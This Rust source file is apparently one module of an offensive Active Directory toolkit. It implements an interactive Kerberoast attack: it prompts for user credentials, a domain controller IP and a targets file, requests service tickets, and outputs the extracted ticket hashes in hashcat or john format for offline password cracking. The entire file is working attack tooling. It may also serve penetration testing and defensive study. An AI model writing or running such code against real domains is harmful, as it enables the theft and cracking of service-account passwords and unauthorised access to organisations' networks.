use dialoguer::Input;
use std::net::IpAddr;
use std::path::Path;

pub fn run_kerberoast() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n=== Kerberoast Attack ===");
    println!("Format encrypted tickets for cracking with hashcat/john\n");

    let username: String = Input::new()
        .with_prompt("Authenticating user")
        .interact_text()?;

    let password: String = Input::new().with_prompt("Password").interact_text()?;

    let domain: String = Input::new().with_prompt("Domain").interact_text()?;

    let dc_ip_str: String = Input::new().with_prompt("DC IP").interact_text()?;

    let dc_ip: IpAddr = dc_ip_str.parse().map_err(|_| {
        std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            format!("Invalid IP address: {}", dc_ip_str),
        )
    })?;

    let targets_file: String = Input::new()
        .with_prompt("Targets file (user/domain/user/user:spn/domain/user:spn)")
        .interact_text()?;

    if !Path::new(&targets_file).exists() {
        return Err(format!("File not found: {}", targets_file).into());
    }

    let format_choice: String = Input::new()
        .with_prompt("Output format (hashcat/john)")
        .default("hashcat".to_string())
        .interact_text()?;

    let crack_format = if format_choice.to_lowercase() == "john" {
        cerbero_lib::CrackFormat::John
    } else {
        cerbero_lib::CrackFormat::Hashcat
    };

    let output_file: Option<String> = Input::new()
        .with_prompt("Output file (optional, press Enter for stdout)")
        .allow_empty(true)
        .interact_text()
        .ok()
        .filter(|s: &String| !s.is_empty());

    let mut ops = crate::kerberos::KerberosOps::new(&domain, dc_ip);

    println!("\n[*] Starting Kerberoast attack...");

    // Map the cerbero_lib::Error into a std::io::Error (or other std error) so `?` can box it.
    let hashes = ops
        .kerberoast_file(&username, &password, &targets_file, crack_format)
        .map_err(|e| {
            std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("kerberoast failed: {:?}", e),
            )
        })?;

    if let Some(output_path) = output_file {
        use std::fs::File;
        use std::io::Write;

        let mut file = File::create(&output_path)?;
        for hash in &hashes {
            writeln!(file, "{}", hash)?;
        }
        println!("\n\x1b[32m[+] Hashes saved to: {}\x1b[0m", output_path);
    } else {
        println!("\n=== Extracted Hashes ===");
        for hash in &hashes {
            println!("{}", hash);
        }
    }

    println!(
        "\x1b[32m[+] Kerberoast complete: {} hash(es)\x1b[0m",
        hashes.len()
    );

    Ok(())
}
